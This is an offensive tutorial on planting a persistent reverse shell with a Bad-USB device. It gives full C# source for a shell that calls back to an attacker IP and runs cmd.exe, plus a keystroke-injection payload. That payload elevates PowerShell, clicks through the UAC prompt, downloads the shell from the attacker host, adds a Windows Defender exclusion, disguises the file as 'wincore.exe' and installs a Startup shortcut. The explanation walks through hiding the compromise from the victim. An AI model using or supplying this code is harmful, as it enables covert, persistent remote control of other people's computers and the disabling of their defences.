

## Presistent reverse shell

A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB of any kind, you can inject a payload to create a persistent reverse shell.

### The shell

First, we need our shell. This will be an executable written in `dotnet core 3.1`:

```C#
﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Shell1
{
    class Program
    {
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            while (true)// keep going
            {
                try
                {
                    connect();
                }
                catch { }
                
                Thread.Sleep(60000); //wait a minute before reconnecting
            }
        }

        private static void connect()
        {
            using(TcpClient client = new TcpClient("192.168.241.1", 8090)) //connect to attacker
            {
                using(Stream stream = client.GetStream())
                {
                    using(StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe"; //use cmd, so it becauses a shell
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);// show the output
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch { }
            }
        }
    }
}
```

This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB.

```whid
Press:131+114
Print:powershell
Press:128+129+176
Press:216+176
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
exit
```

This little piece of code will make the perfect shell. Let's look at it line by line.

```whid
Press:131+114
```

This simulates a key-press by using Arduino keyboard-codes. `131` is the Windows-key and `114` is the letter 'r'. This will open the `Run` box on windows, allowing you to start an executable.

```whid
Print:powershell
```

This just types powershell into the `Run` box without an `enter` key pressed.

```whid
Press:128+129+176
Press:216+176
```

The first line uses the Arduino codes again to press `control`, `shift` and `enter`. This will run the given command (`powershell`) as administrator, we need this to disable Windows Defender. The second line will type the left arrow and `enter`, so that the UAC (admin-prompt) is answered with `yes`.

```powershell
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/invis.vbs", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs")
```

This is where the juicy stuff starts, first we download the `shell.exe` and a `vb` script called `invis.vbs`.

```vbs
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
```

Why do we need this? This little script runs an executable completely hidden. Only far into taskmanager can you find the process, but nobody expects a process called `wincore` to be evil.

Both files are downloaded into `C:\users\{user}\AppData\Local\Microsoft\Windows\0\`, a folder very little people dare to even open, this is just another step to make the shell look like a windows process to "normal" people.

```powershell
PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
```

This line is the reason that powershell must start with privileges, this line makes a exclusion in Defender for all the processes named `wincore.exe`. This allows the shell to run without any interjection from Windows Defender.

```powershell
PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
```

And lastly, we create a shortcut in `C:\users\{user}\AppDate\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`. Everything executable or shortcut in this folder is run after the user logs in. This way we can start our shell every time the system boots. This does not run the shell yet, however if you want to run it immediately, you can just add this line to the script:

```powershell
PrinteLine:C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Roaming\..\Local\Microsoft\Windows\0\start.vbs" "C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe"
```
This is simply the content of the shortcut.

We end the script with `exit`, so the user does not see that something is up. Currenty, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.